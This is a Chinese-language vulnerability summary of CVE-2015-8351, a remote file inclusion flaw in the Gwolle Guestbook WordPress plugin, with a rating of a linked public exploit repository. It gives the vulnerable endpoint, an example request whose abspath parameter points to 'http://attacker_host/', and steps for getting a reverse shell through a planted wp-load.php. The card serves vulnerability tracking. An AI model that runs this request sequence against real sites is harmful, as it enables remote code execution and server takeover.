## CVE-2015-8351 - Gwolle Guestbook WordPress Plugin RFI

**漏洞编号:** CVE-2015-8351

**漏洞类型:** 远程文件包含 (RFI)

**影响应用:** Gwolle Guestbook WordPress Plugin

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** < 1.5.4

**利用条件:** allow_url_include 需要启用或者可利用本地文件包含。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞存在于 Gwolle Guestbook WordPress 插件 1.5.4 之前的版本中。攻击者可以利用 `abspath` 参数在 `frontend/captcha/ajaxresponse.php` 文件中包含远程文件，从而执行任意 PHP 代码。根据漏洞描述，如果 `allow_url_include` 启用，则可直接利用远程文件包含。即使 `allow_url_include` 未启用，也可以通过目录遍历序列利用本地文件包含。

**有效性:** 提供的 Python 脚本通过构造包含恶意 URL 的 `abspath` 参数来利用 RFI 漏洞。脚本尝试访问 `target_url/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://attacker_host/`。如果目标服务器成功包含攻击者服务器上的文件，则意味着漏洞利用成功。脚本会尝试建立反向 shell, 如果成功收到shell, 漏洞利用成功

**投毒风险:**  代码本身相对简单，主要功能是发送包含恶意 `abspath` 参数的 HTTP 请求。 风险在于，攻击者可能在 `attacker_host` 指向的服务器上放置恶意 `wp-load.php` 文件。 脚本本身投毒风险较低，主要在于利用过程中。 5%的可能性在于提供的README.md文件中,包含了下载或者安装步骤,可能引导用户下载安装带有后门的wp-load.php，但是可能性比较小。

**利用方式:**
1.  攻击者搭建一个 Web 服务器，并将包含恶意代码的 `wp-load.php` 文件放置在其文档根目录下。
2.  攻击者运行提供的 Python 脚本，指定目标 WordPress 网站的 URL、攻击者服务器的 IP 地址和监听端口。
3.  脚本构造一个包含恶意 URL 的 HTTP GET 请求，并将请求发送到目标服务器的 `frontend/captcha/ajaxresponse.php` 文件。
4.  如果目标服务器成功包含攻击者服务器上的 `wp-load.php` 文件，则恶意代码将在目标服务器上执行。如果成功, 攻击者在本地监听端口就可以获取到shell.

**项目地址:** [G4sp4rCS/exploit-CVE-2015-8351](https://github.com/G4sp4rCS/exploit-CVE-2015-8351)

**漏洞详情:** [CVE-2015-8351](https://nvd.nist.gov/vuln/detail/CVE-2015-8351)